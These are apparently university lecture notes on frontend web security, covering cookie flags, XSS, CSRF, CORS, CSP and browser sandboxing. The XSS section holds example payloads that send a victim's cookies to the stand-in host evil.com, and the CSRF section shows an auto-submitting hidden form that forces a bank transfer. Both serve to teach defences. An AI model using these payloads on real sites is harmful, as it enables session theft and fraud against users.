# Week 12 — Section 2: Frontend Security

---

## 2.1 Threat Landscape & Scenarios

### Interactivity Tiers & Data Risk

The frontend's attack surface grows with its interactivity. Not all web pages carry the same risk:

| Tier | Example | Risk Level | Why |
|---|---|---|---|
| **Static HTML** | A blog with no forms, no JS | Low | No user input, no dynamic execution, no state |
| **Simple Forms** | Contact form, login page | Medium | User data submitted; form fields can be tampered with |
| **Rich JS SPA** | Gmail, Twitter, online banking | High | Complex client-side logic, persistent sessions, third-party scripts, dynamic DOM, OAuth flows |

- As complexity increases, the **attack surface expands** exponentially — more code = more potential vulnerabilities.
- SPAs (Single Page Applications built with React, Vue, Angular) are especially risky because they:
  - Execute a large amount of JavaScript in the browser.
  - Manage client-side routing and sensitive state.
  - Load dozens of third-party scripts (analytics, ads, chat widgets).

### Resource Inclusion Risks
When your page loads resources from external sources, you are **implicitly trusting those sources**:

- **Cross-site cookies:** Third-party scripts can set and read their own cookies to track users across sites.
- **Tracking pixels:** Invisible 1×1 pixel `<img>` tags embedded in pages (and emails) that report back load events — identifying the user's IP, device, time of visit, and email open events.
- **CDN-based profiling:** Loading jQuery, fonts, or analytics from a CDN (e.g., `cdn.example.com/jquery.js`) allows that CDN operator to see exactly which users visited which pages across every site using that CDN.
  - **Example:** Google Fonts and Google Analytics, when loaded from Google's CDN, report the user's browser and IP to Google even on non-Google sites.
  - **Mitigation:** Self-host static resources where possible, or use the `crossorigin="anonymous"` attribute and `Subresource Integrity (SRI)` hashes to verify resource integrity.

### Client-Side Exploits & Malware
Beyond web attacks, the browser itself is a platform that can be abused:

- **Spyware / Malicious browser extensions:** Extensions run with elevated permissions and can read all page content, form data, and cookies across every site you visit. Malicious extensions have stolen banking credentials and crypto wallets at scale.
- **Keystroke loggers:** JavaScript injected into a page (via XSS or a compromised third-party script) can capture every keystroke — including passwords typed into forms.
- **Cross-tab leakage:** Browser APIs like `localStorage`, `sessionStorage`, and `SharedWorker` can be accessed across tabs from the same origin — a compromised script in one tab can exfiltrate data from another.
- **Clickjacking:** Embedding your page inside a hidden `<iframe>` on an attacker's page, tricking the user into clicking UI elements on your site while thinking they are clicking on something else.
  - **Defense:** `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors 'none'` response headers.

---

## 2.2 Cookie Security & Privacy

Cookies are small pieces of data stored in the browser that websites use to maintain state across stateless HTTP requests.

### Session Cookies vs Permanent / Persistent Cookies

| Property | Session Cookie | Persistent Cookie |
|---|---|---|
| **Lifespan** | Deleted when the browser closes | Survives browser close; lives until `Expires` / `Max-Age` |
| **Use case** | Login sessions, shopping cart | "Remember Me", user preferences, long-term tracking |
| **Risk** | Stolen if session hijacking occurs | Long-lived = longer window for theft/tracking |
| **GDPR implication** | Generally exempt from consent requirement (functional) | Often requires explicit user consent (especially for tracking) |

- **"Remember Me" authentication:** Sets a long-lived persistent cookie (sometimes valid for 30–90 days) so users stay logged in. This cookie is a **high-value target** — if stolen, the attacker can impersonate the user for weeks.
- **GDPR Consent Banners:** Those cookie pop-ups exist because GDPR requires explicit consent before setting non-essential (e.g., tracking/analytics) cookies. Strictly necessary cookies (session management) are exempt.

### Cookie Security Flags
Cookies can be made more secure using **security attributes**:

| Flag | What it does | Why it matters |
|---|---|---|
| `HttpOnly` | Cookie is inaccessible to JavaScript (`document.cookie`) | Prevents cookie theft via XSS |
| `Secure` | Cookie only sent over HTTPS connections | Prevents cookie interception on plain HTTP |
| `SameSite=Strict` | Cookie only sent for same-site requests | Prevents CSRF attacks |
| `SameSite=Lax` | Cookie sent for same-site + top-level navigation from other sites | A balance between security and usability |
| `SameSite=None; Secure` | Cookie sent for all cross-site requests (must be Secure) | Required for legitimate third-party use cases (e.g., embedded iframes) |

> ⚠️ **Best practice:** All session/auth cookies should have `HttpOnly`, `Secure`, and `SameSite=Strict` (or `Lax`) at minimum.

### First-Party vs Third-Party Cookies

| | First-Party Cookie | Third-Party Cookie |
|---|---|---|
| **Set by** | The domain you are visiting | A different domain (e.g., ad network, analytics) whose scripts run on the page |
| **Purpose** | Session management, preferences, login state | Cross-site behavioral tracking, ad targeting |
| **User awareness** | Generally expected and accepted | Often invisible and non-consensual |
| **Regulation** | Largely functional; usually exempt | Requires consent under GDPR; being phased out by browsers |

- **Browser Phase-out of Third-Party Cookies:**
  - **Safari (ITP — Intelligent Tracking Prevention):** Blocks third-party cookies by default since 2017.
  - **Firefox:** Blocks third-party cookies by default since 2019.
  - **Chrome:** Announced plans to deprecate third-party cookies (delayed multiple times, now targeting 2025+). The largest ad platform resisting the change it is simultaneously pushing.
- **Tracking without cookies (post-cookie tracking):**
  - Device fingerprinting (no cookie needed).
  - First-party data strategies (login walls, newsletter subscriptions).
  - Google's Privacy Sandbox proposals (Topics API, FLEDGE) — controversial alternatives.

---

## 2.3 Web Application Vulnerabilities & Client Attacks

### Cross-Site Scripting (XSS)

**Definition:** XSS is an attack where an attacker injects malicious JavaScript into a web page that is then **executed in the browsers of other users**.

**Why it's dangerous:** JavaScript executing in a user's browser has access to:
- All cookies for that domain (unless `HttpOnly`).
- The full DOM — everything the user sees.
- The user's keystrokes, clipboard, form input.
- Can make authenticated requests on behalf of the user.
- Can redirect the user to phishing pages.

#### Type 1: Reflected XSS (Non-Persistent)

- **How it works:** Malicious script is embedded in a URL (query parameter, path, etc.). The server reflects this input back in the HTML response without sanitization. The victim clicks a crafted link.
- **Attack flow:**
  1. Attacker crafts a URL: `https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>`
  2. Victim clicks the link (sent via phishing email, social media, etc.).
  3. Server reflects the `q` parameter into the response HTML.
  4. Browser executes the injected script.
  5. Victim's cookies are sent to `evil.com`.
- **Key characteristic:** The payload is in the URL and only affects the user who clicks that specific link. Not stored server-side.

#### Type 2: Stored XSS (Persistent)

- **How it works:** Malicious script is submitted and **stored in the database** (e.g., in a forum post, comment, username, profile bio). Every user who views that content has the script executed in their browser.
- **Attack flow:**
  1. Attacker posts a comment: `Nice article! <script>fetch('https://evil.com/steal?c='+document.cookie)</script>`
  2. Server stores this in the database without sanitization.
  3. Every user who loads the comment page gets the script executed.
  4. All their cookies are exfiltrated to `evil.com`.
- **Key characteristic:** One injection affects **all users** — far more dangerous than Reflected XSS. Classic example: the **Samy worm** (2005) on MySpace spread as a Stored XSS worm and infected 1 million profiles in 20 hours.

#### Type 3: DOM-Based XSS
- The server sends a safe response, but **client-side JavaScript** unsafely reads attacker-controlled data (e.g., `location.hash`, `document.referrer`) and injects it into the DOM.
- The payload never touches the server — purely a client-side vulnerability.

#### XSS Defenses

| Defense | Description |
|---|---|
| **Server-side input validation** | Reject inputs containing unexpected characters at the API/server layer |
| **Server-side output encoding** | HTML-encode all user-supplied data before inserting into HTML (`&lt;` instead of `<`) |
| **Use safe DOM APIs** | Use `textContent` instead of `innerHTML`; avoid `eval()`, `document.write()` |
| **Content Security Policy (CSP)** | Browser-enforced policy that blocks inline scripts and restricts script sources (see Section 2.4) |
| **HttpOnly cookies** | Prevents XSS from stealing session cookies even if script runs |
| **Sanitization libraries** | Use battle-tested libraries like DOMPurify for any situation where HTML must be rendered |

> ⚠️ **Golden rule:** Never trust user input. Validate on input, encode on output.

---

### Cross-Site Request Forgery (CSRF)

**Definition:** CSRF is an attack where a malicious website **tricks the user's browser into making an authenticated request** to a different website where the user is already logged in.

**Why it works:** Browsers automatically attach cookies (including session cookies) to every request made to a domain — including requests triggered by a different, malicious website.

#### Attack Mechanics

**Scenario:** A user is logged into their bank (`mybank.com`). The attacker tricks them into visiting `evil.com`.

1. User is logged into `mybank.com` — their browser holds a valid session cookie.
2. User visits `evil.com` (e.g., via phishing link).
3. `evil.com` contains a hidden form or image tag:
   ```html
   <!-- Hidden image tag that triggers a GET request -->
   <img src="https://mybank.com/transfer?to=attacker&amount=10000">

   <!-- Or a form that auto-submits -->
   <form action="https://mybank.com/transfer" method="POST">
     <input type="hidden" name="to" value="attacker_account">
     <input type="hidden" name="amount" value="10000">
   </form>
   <script>document.forms[0].submit();</script>
   ```
4. The browser sends the request to `mybank.com` **with the user's session cookie** attached automatically.
5. `mybank.com` sees a valid, authenticated request and executes the transfer.

**Key distinction from XSS:** CSRF exploits the **trust the server has in the browser** (the browser's session cookie). XSS exploits the **trust the browser has in the server** (executing server-returned scripts).

#### CSRF Defenses

**1. Anti-CSRF Tokens (Synchronizer Token Pattern) — Primary Defense**
- The server generates a **unique, unpredictable, cryptographically random token** for each session (or each form).
- The token is embedded as a hidden field in every state-changing form.
- On form submission, the server validates that the token matches.
- A cross-site attacker **cannot read the token** (Same-Origin Policy prevents cross-origin page reads), so they cannot forge a valid request.

```html
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="a9f3k2...randomtoken...x8j1">
  <input name="amount" value="100">
  <button type="submit">Transfer</button>
</form>
```

Token requirements: **unique per session** (or per request), **cryptographically secure random**, **time-limited** (expire after N minutes).

**2. `SameSite` Cookie Attribute**
- `SameSite=Strict` or `SameSite=Lax` on session cookies prevents them from being sent on cross-site requests.
- This is now the **simplest and most effective** first line of defense.
- Modern browsers set `SameSite=Lax` by default for cookies that don't specify the attribute.

**3. Double Submit Cookie Pattern**
- A random value is sent both as a cookie and as a request parameter.
- Server validates that the two match.
- Attacker cannot read the cookie value from a cross-origin page.

**4. Custom Request Headers**
- AJAX requests can include a custom header (e.g., `X-Requested-With: XMLHttpRequest`).
- Browsers enforce the Same-Origin Policy for custom headers — cross-site requests cannot set them.

| Defense | Protects Against | Notes |
|---|---|---|
| **Anti-CSRF Token** | CSRF | Gold standard; required for older browsers |
| **`SameSite=Strict`** | CSRF | Best modern approach; may break some flows |
| **`SameSite=Lax`** | Most CSRF | Default in modern browsers; allows top-level GETs |
| **Custom Header** | CSRF via AJAX | Works for XHR/fetch; not for form submissions |
| **Referer/Origin Validation** | Some CSRF | Fragile; can be stripped by proxies |

---

## 2.4 Browser Security Mechanisms & Policies

### Same-Origin Policy (SOP)

**Definition:** The Same-Origin Policy is the browser's fundamental security boundary. It restricts how documents and scripts from one **origin** can interact with resources from a different origin.

**Origin = Protocol + Hostname + Port**

| URL | Same origin as `https://example.com:443`? | Reason |
|---|---|---|
| `https://example.com/page` | ✅ Yes | Same protocol, host, port |
| `http://example.com` | ❌ No | Different protocol (http vs https) |
| `https://api.example.com` | ❌ No | Different subdomain |
| `https://example.com:8080` | ❌ No | Different port |
| `https://other.com` | ❌ No | Different host |

**What SOP prevents:**
- A script on `evil.com` cannot read the DOM or response of `mybank.com`.
- A script on `evil.com` cannot read cookies from `mybank.com`.
- A script on `evil.com` cannot make and read the response of authenticated requests to `mybank.com`.

> Note: SOP prevents **reading** cross-origin responses. It does NOT prevent cross-origin requests from being *sent* — which is why CSRF is still possible (browser sends the request, but `evil.com` can't read the response).

---

### Cross-Origin Resource Sharing (CORS)

**The problem CORS solves:** Modern web apps legitimately need to make cross-origin requests. E.g., your frontend at `https://app.example.com` needs to call your API at `https://api.example.com`. SOP blocks this by default.

**How CORS works:** The server explicitly tells the browser which cross-origins are allowed to read its responses using HTTP response headers.

**CORS Headers:**

| Header | Example Value | Purpose |
|---|---|---|
| `Access-Control-Allow-Origin` | `https://app.example.com` | Which origins may access this resource |
| `Access-Control-Allow-Methods` | `GET, POST, PUT` | Which HTTP methods are allowed |
| `Access-Control-Allow-Headers` | `Content-Type, Authorization` | Which request headers are allowed |
| `Access-Control-Allow-Credentials` | `true` | Whether cookies/auth headers may be sent |
| `Access-Control-Max-Age` | `3600` | How long the browser can cache preflight results |

**The Preflight Request:**
For "non-simple" requests (e.g., POST with JSON body, custom headers), the browser first sends an `OPTIONS` request to check if the actual request is permitted:
```
OPTIONS /api/data HTTP/1.1
Origin: https://app.example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Content-Type
```
Server responds with the allowed configuration, and only then does the browser send the actual request.

**Common CORS Misconfigurations:**

| Misconfiguration | Problem |
|---|---|
| `Access-Control-Allow-Origin: *` | Allows any site to read responses — dangerous for authenticated endpoints |
| `Access-Control-Allow-Origin: *` + `Credentials: true` | **Invalid** — browsers reject this combination, but some workarounds exist |
| Reflecting `Origin` header blindly | `Origin: evil.com` → `Access-Control-Allow-Origin: evil.com` — makes CORS useless |
| Allowlisting with weak regex | `origin.endsWith('example.com')` allows `evil-example.com` |

> ⚠️ **Rule:** Never use `Access-Control-Allow-Origin: *` for authenticated APIs. Always allowlist specific trusted origins.

---

### Content Security Policy (CSP)

**Definition:** CSP is an HTTP response header (or `<meta>` tag) that tells the browser **exactly what resources are allowed to load and execute** on a page. It is the most powerful browser-enforced defense against XSS.

**How it works:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.trusted.com; img-src *; style-src 'self' 'unsafe-inline'
```

**CSP Directives:**

| Directive | Controls |
|---|---|
| `default-src` | Fallback for all resource types not explicitly listed |
| `script-src` | Where JavaScript can be loaded from |
| `style-src` | Where CSS can be loaded from |
| `img-src` | Where images can be loaded from |
| `connect-src` | Which URLs can be contacted via XHR, Fetch, WebSocket |
| `font-src` | Where fonts can be loaded from |
| `frame-src` | Which origins can be embedded in iframes |
| `form-action` | Where forms can submit data |
| `frame-ancestors` | Which pages can embed this page (replaces `X-Frame-Options`) |

**CSP Source Values:**

| Value | Meaning |
|---|---|
| `'self'` | Same origin only |
| `'none'` | No sources allowed |
| `https://cdn.example.com` | Specific external domain |
| `'unsafe-inline'` | Allow inline scripts/styles — **defeats much of CSP's value** |
| `'unsafe-eval'` | Allow `eval()` — **avoid if possible** |
| `'nonce-{random}'` | Allow specific inline scripts with matching nonce attribute |
| `'sha256-{hash}'` | Allow specific inline scripts by their content hash |

**CSP Report-Only Mode:** (`Content-Security-Policy-Report-Only`)
- Policy is **not enforced** — violations are only reported to a specified endpoint.
- Useful for testing a CSP policy before enforcing it in production.

**Impact of CSP:**
- Even if an XSS injection succeeds, CSP prevents the injected script from loading remote payloads or exfiltrating data to unauthorized domains.
- Nonce-based CSP effectively eliminates injected `<script>` tags since the attacker cannot know the server-generated nonce.

---

### Secure Contexts

**Definition:** A **Secure Context** is an origin that has been delivered over HTTPS (or from `localhost`). Modern browsers restrict access to powerful web APIs only to secure contexts.

**APIs restricted to secure contexts:**

| API | Why it needs HTTPS |
|---|---|
| **Service Workers** | Can intercept all network requests; would be extremely dangerous over HTTP |
| **Geolocation API** | Physical location data; must be protected |
| **Camera / Microphone (getUserMedia)** | Sensitive input; must not be interceptable |
| **Web Bluetooth / USB** | Direct hardware access |
| **Payment Request API** | Financial transactions |
| **Web Crypto API** | Cryptographic operations |
| **Push Notifications** | Must be authorized by the real site, not a MitM |

**Why this matters:** If your site serves over plain HTTP, a network attacker (e.g., on the same Wi-Fi) can intercept and modify any page content — potentially injecting scripts. Restricting powerful APIs to HTTPS ensures that these capabilities cannot be hijacked.

**Practical implication:** In 2024, **HTTPS is mandatory for any modern web app**. All major browser features, PWA capabilities, and security policies require it. HTTP is effectively a development-only protocol.

---

### Browser Sandboxing

**Definition:** Modern browsers run each tab (and often each iframe/extension) in a **separate sandboxed process**, isolated from the host operating system and from each other.

**How it works (Chromium multi-process architecture):**
- **Browser Process:** Manages UI, coordinates other processes. Has OS-level privileges.
- **Renderer Process:** Runs web content (HTML, CSS, JS). Runs with **minimal OS privileges** in a sandbox — cannot directly access the filesystem, network sockets, or OS APIs.
- **GPU Process:** Handles graphics; sandboxed separately.
- **Network Process:** Handles network requests; separate.

**What sandboxing prevents:**
- A compromised web page cannot directly read files from your computer.
- A compromised web page cannot make raw socket connections.
- A compromised web page cannot execute arbitrary OS commands.
- Malicious content in one tab cannot directly access content or memory of another tab from a different origin.

**Limitations of sandboxing:**
- **Sandbox escapes:** Vulnerabilities in the browser's own code can allow a renderer process to break out of the sandbox. These are among the most critical (and valuable) browser vulnerabilities.
- **Spectre / Meltdown (2018):** CPU-level speculative execution vulnerabilities allowed JavaScript in one browser process to potentially read memory from other processes — a fundamental limit of process isolation on shared CPU architectures.
  - **Browser response:** Reduced timer resolution, disabled `SharedArrayBuffer` temporarily, introduced cross-origin isolation headers (`Cross-Origin-Opener-Policy`, `Cross-Origin-Embedder-Policy`).

---

## 2.5 Frontend Security Summary & Best Practices

| Area | Key Security Practice |
|---|---|
| **Cookies** | Always use `HttpOnly`, `Secure`, `SameSite=Strict/Lax` |
| **XSS Prevention** | Validate input, encode output, use CSP, avoid `innerHTML` / `eval()` |
| **CSRF Prevention** | Use `SameSite` cookies + Anti-CSRF tokens for state-changing operations |
| **CORS** | Explicitly allowlist trusted origins; never use `*` for authenticated APIs |
| **CSP** | Deploy a strict policy; use nonces for inline scripts; use Report-Only to test |
| **HTTPS** | Mandatory for all production apps; enables Secure Contexts and modern APIs |
| **Third-Party Scripts** | Minimize; use SRI hashes; self-host where possible |
| **Clickjacking** | Use `Content-Security-Policy: frame-ancestors 'none'` |
| **Sandboxing iframes** | Use the `sandbox` attribute on `<iframe>` to restrict capabilities |
| **Input Validation** | Always re-validate on the server — frontend validation is for UX only |

> 💡 **Layered Defense:** No single mechanism is sufficient. Stack multiple defenses: `SameSite` cookies + CSRF tokens + CSP + input sanitization work together. If one layer fails, others still protect the user.

---

*← [Section 1: Fundamentals](./01_fundamentals_privacy_vs_security.md) | Next → Section 3: Backend Security*
